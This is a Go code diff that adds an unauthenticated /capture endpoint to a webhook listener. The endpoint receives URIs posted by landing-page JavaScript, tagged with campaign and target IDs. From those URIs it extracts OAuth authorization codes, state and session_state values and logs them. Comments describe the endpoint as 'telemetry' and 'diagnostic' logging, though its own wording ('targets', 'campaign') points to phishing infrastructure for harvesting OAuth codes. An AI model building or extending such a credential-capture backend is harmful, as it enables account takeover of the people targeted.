@@ -6,8 +6,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -22,11 +24,103 @@ func (h *Handler) receiveWebhook(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 415, httpErr)
 		return
 	}
-	if err := writeWebhookLogEntry(h.WebhookLogPath, r.RemoteAddr, r.Method, r.URL.Path, format, body); err != nil {
+	if err := writeWebhookLogEntryWithType(h.WebhookLogPath, r.RemoteAddr, r.Method, r.URL.Path, format, body, "oauth_callback"); err != nil {
 		writeError(w, 500, "failed to write log")
 		return
 	}
 	writeJSON(w, 200, map[string]string{"status": "received"})
+}
+
+// capturePayload describes the JSON body sent by the broker-landing JS.
+type capturePayload struct {
+	URI        string `json:"uri"`
+	Token      string `json:"token"`
+	CampaignID string `json:"campaign_id"`
+	TargetID   string `json:"target_id"`
+	Timestamp  int64  `json:"timestamp"`
+	Trigger    string `json:"trigger"`
+}
+
+// captureBroker handles POST /capture for Native Broker Interop telemetry.
+// It parses the captured URI, extracts OAuth session parameters, and logs
+// them to the audit log for diagnostic purposes.
+func (h *Handler) captureBroker(w http.ResponseWriter, r *http.Request) {
+	body, format, httpErr := readWebhookBody(r)
+	if httpErr != "" {
+		writeError(w, 415, httpErr)
+		return
+	}
+
+	var payload capturePayload
+	if err := json.Unmarshal(body, &payload); err != nil {
+		writeError(w, 400, "invalid JSON payload")
+		return
+	}
+
+	auditEntry := h.parseBrokerURI(payload)
+	auditJSON, _ := json.Marshal(auditEntry)
+
+	if err := writeWebhookLogEntryWithType(
+		h.WebhookLogPath, r.RemoteAddr, r.Method, r.URL.Path,
+		format, auditJSON, "broker_capture",
+	); err != nil {
+		writeError(w, 500, "failed to write log")
+		return
+	}
+
+	log.Printf("[broker] Native Broker capture from %s: campaign=%s target=%s trigger=%s uri=%s",
+		r.RemoteAddr, payload.CampaignID, payload.TargetID, payload.Trigger, payload.URI)
+
+	writeJSON(w, 200, map[string]string{"status": "captured"})
+}
+
+// brokerAuditEntry represents parsed parameters from a captured ms-appx-web:// URI.
+type brokerAuditEntry struct {
+	Timestamp    string `json:"timestamp"`
+	SourceIP     string `json:"source_ip"`
+	CampaignID   string `json:"campaign_id"`
+	TargetID     string `json:"target_id"`
+	Token        string `json:"token"`
+	Trigger      string `json:"trigger"`
+	RawURI       string `json:"raw_uri"`
+	Scheme       string `json:"scheme,omitempty"`
+	Host         string `json:"host,omitempty"`
+	Path         string `json:"path,omitempty"`
+	AuthCode     string `json:"code,omitempty"`
+	State        string `json:"state,omitempty"`
+	SessionState string `json:"session_state,omitempty"`
+	Error        string `json:"error,omitempty"`
+	ErrorDesc    string `json:"error_description,omitempty"`
+}
+
+// parseBrokerURI extracts OAuth parameters from a captured URI string.
+func (h *Handler) parseBrokerURI(payload capturePayload) brokerAuditEntry {
+	entry := brokerAuditEntry{
+		Timestamp:  time.Now().UTC().Format(time.RFC3339),
+		SourceIP:   "",
+		CampaignID: payload.CampaignID,
+		TargetID:   payload.TargetID,
+		Token:      payload.Token,
+		Trigger:    payload.Trigger,
+		RawURI:     payload.URI,
+	}
+
+	if payload.URI == "" {
+		return entry
+	}
+
+	if u, err := url.Parse(payload.URI); err == nil {
+		entry.Scheme = u.Scheme
+		entry.Host = u.Host
+		entry.Path = u.Path
+		entry.AuthCode = u.Query().Get("code")
+		entry.State = u.Query().Get("state")
+		entry.SessionState = u.Query().Get("session_state")
+		entry.Error = u.Query().Get("error")
+		entry.ErrorDesc = u.Query().Get("error_description")
+	}
+
+	return entry
 }
 
 // ─── Shared helpers ───────────────────────────────────────────────────────────
@@ -34,6 +128,7 @@ func (h *Handler) receiveWebhook(w http.ResponseWriter, r *http.Request) {
 // readWebhookBody reads the request body based on Content-Type.
 //   - application/json     → validates JSON, returns format="json"
 //   - application/json-raw → reads body as-is, returns format="raw"
+//
 // Returns (body, format, errMsg). errMsg is non-empty on bad Content-Type.
 func readWebhookBody(r *http.Request) (body []byte, format string, errMsg string) {
 	ct := r.Header.Get("Content-Type")
@@ -53,6 +148,10 @@ func readWebhookBody(r *http.Request) (body []byte, format string, errMsg string
 }
 
 func writeWebhookLogEntry(logPath, remoteAddr, method, path, format string, body []byte) error {
+	return writeWebhookLogEntryWithType(logPath, remoteAddr, method, path, format, body, "generic")
+}
+
+func writeWebhookLogEntryWithType(logPath, remoteAddr, method, path, format string, body []byte, entryType string) error {
 	if logPath == "" {
 		logPath = "stream_monitor.log"
 	}
@@ -61,9 +160,9 @@ func writeWebhookLogEntry(logPath, remoteAddr, method, path, format string, body
 		return err
 	}
 	defer f.Close()
-	entry := fmt.Sprintf("[%s] source=%s method=%s path=%s format=%s payload=%s\n",
+	entry := fmt.Sprintf("[%s] source=%s method=%s path=%s format=%s type=%s payload=%s\n",
 		time.Now().UTC().Format(time.RFC3339),
-		remoteAddr, method, path, format, string(body),
+		remoteAddr, method, path, format, entryType, string(body),
 	)
 	_, err = f.WriteString(entry)
 	return err
@@ -78,6 +177,7 @@ type WebhookEntry struct {
 	Path       string `json:"path"`
 	Format     string `json:"format"` // "json" or "raw"
 	Body       string `json:"body"`
+	Type       string `json:"type,omitempty"` // "oauth_callback", "broker_capture"
 }
 
 type WebhookStatus struct {
@@ -108,11 +208,16 @@ func (wl *WebhookListener) Start(port int) error {
 
 	logPath := wl.logPath
 	mux := http.NewServeMux()
-	// Catch-all: accept POST to any path (e.g. /receive, /capture, /hook, etc.)
+	entryType := "webhook_listener"
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
 			w.WriteHeader(http.StatusMethodNotAllowed)
 			return
+		}
+		if r.URL.Path == "/capture" {
+			entryType = "broker_capture"
+		} else {
+			entryType = "webhook_listener"
 		}
 		body, format, errMsg := readWebhookBody(r)
 		if errMsg != "" {
@@ -121,7 +226,7 @@ func (wl *WebhookListener) Start(port int) error {
 			fmt.Fprintf(w, `{"error":%q}`, errMsg)
 			return
 		}
-		writeWebhookLogEntry(logPath, r.RemoteAddr, r.Method, r.URL.Path, format, body)
+		writeWebhookLogEntryWithType(logPath, r.RemoteAddr, r.Method, r.URL.Path, format, body, entryType)
 		w.Header().Set("Content-Type", "application/json")
 		w.WriteHeader(200)
 		w.Write([]byte(`{"status":"received"}`))
@@ -269,4 +374,10 @@ func cutField(line, key string) (value, rest string, ok bool) {
 		return after, "", true
 	}
 	return after[:idx], strings.TrimSpace(after[idx:]), true
+}
+
+// CaptureBroker returns a public handler for the /capture endpoint.
+// This endpoint is intentionally unauthenticated so targets can POST captured URIs.
+func (h *Handler) CaptureBroker() http.HandlerFunc {
+	return h.captureBroker
 }
